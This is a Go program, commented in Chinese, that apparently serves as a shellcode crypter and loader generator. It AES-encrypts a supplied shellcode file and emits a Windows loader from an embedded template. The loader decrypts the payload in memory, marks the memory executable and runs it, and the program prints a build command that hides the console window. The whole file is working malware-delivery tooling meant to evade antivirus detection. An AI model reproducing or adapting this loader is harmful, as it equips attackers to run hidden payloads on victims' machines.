package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"os"
	"text/template"
)

const loaderTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

func main() {
	encryptedShellcode := "{{ .Shellcode }}"
	key := "{{ .Key }}"
	iv := "{{ .IV }}"

	// 解码加密数据
	shellcode, err := hex.DecodeString(encryptedShellcode)
	if err != nil {
		panic(fmt.Sprintf("解码shellcode失败: %v", err))
	}
	
	keyBytes, err := hex.DecodeString(key)
	if err != nil {
		panic(fmt.Sprintf("解码密钥失败: %v", err))
	}
	
	ivBytes, err := hex.DecodeString(iv)
	if err != nil {
		panic(fmt.Sprintf("解码IV失败: %v", err))
	}

	// 解密
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		panic(fmt.Sprintf("创建cipher失败: %v", err))
	}
	
	mode := cipher.NewCBCDecrypter(block, ivBytes)
	decrypted := make([]byte, len(shellcode))
	mode.CryptBlocks(decrypted, shellcode)

	// 移除填充
	padding := int(decrypted[len(decrypted)-1])
	decrypted = decrypted[:len(decrypted)-padding]

	// 分配内存
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(decrypted)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,  // 首先设置为可读写
	)
	if err != nil {
		panic(fmt.Sprintf("内存分配失败: %v", err))
	}

	// 复制shellcode到内存
	buffer := (*[990000]byte)(unsafe.Pointer(addr))
	copy(buffer[:], decrypted)

	// 修改内存保护为可执行
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(decrypted)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("修改内存保护失败: %v", err))
	}

	// 执行shellcode
	shellcodePtr := unsafe.Pointer(addr)
	syscall.SyscallN(uintptr(shellcodePtr))
}`

type TemplateData struct {
	Shellcode string
	Key       string
	IV        string
}

func main() {
	inputFile := flag.String("i", "", "输入的shellcode文件路径")
	outputFile := flag.String("o", "loader.go", "输出的加载器文件路径")
	flag.Parse()

	if *inputFile == "" {
		fmt.Println("请指定输入文件路径: -i shellcode.bin")
		return
	}

	// 读取shellcode
	shellcode, err := os.ReadFile(*inputFile)
	if err != nil {
		panic(fmt.Sprintf("读取shellcode文件失败: %v", err))
	}

	// 生成密钥和IV
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		panic(err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	// 创建加密块
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// 填充
	padding := aes.BlockSize - len(shellcode)%aes.BlockSize
	padtext := make([]byte, len(shellcode)+padding)
	copy(padtext, shellcode)
	for i := len(shellcode); i < len(padtext); i++ {
		padtext[i] = byte(padding)
	}

	// 加密
	ciphertext := make([]byte, len(padtext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, padtext)

	// 准备模板数据
	data := TemplateData{
		Shellcode: hex.EncodeToString(ciphertext),
		Key:       hex.EncodeToString(key),
		IV:        hex.EncodeToString(iv),
	}

	// 生成加载器代码
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		panic(fmt.Sprintf("解析模板失败: %v", err))
	}

	// 创建输出文件
	f, err := os.Create(*outputFile)
	if err != nil {
		panic(fmt.Sprintf("创建输出文件失败: %v", err))
	}
	defer f.Close()

	// 写入生成的代码
	err = tmpl.Execute(f, data)
	if err != nil {
		panic(fmt.Sprintf("生成代码失败: %v", err))
	}

	fmt.Printf("加密完成！加载器已生成到: %s\n", *outputFile)
	fmt.Println("\n编译命令:")
	fmt.Printf("go build -ldflags \"-H windowsgui\" %s\n", *outputFile)
}
